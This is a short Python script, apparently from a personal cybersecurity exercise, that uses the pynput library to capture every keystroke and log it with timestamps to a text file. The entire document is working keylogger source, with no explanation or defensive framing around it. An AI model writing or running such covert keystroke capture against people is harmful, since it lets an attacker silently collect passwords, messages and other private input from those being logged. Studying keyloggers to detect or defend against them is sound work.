import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = r"C:/Users/Ronit Khanna/OneDrive/Desktop/cybersec/kl"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
   logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
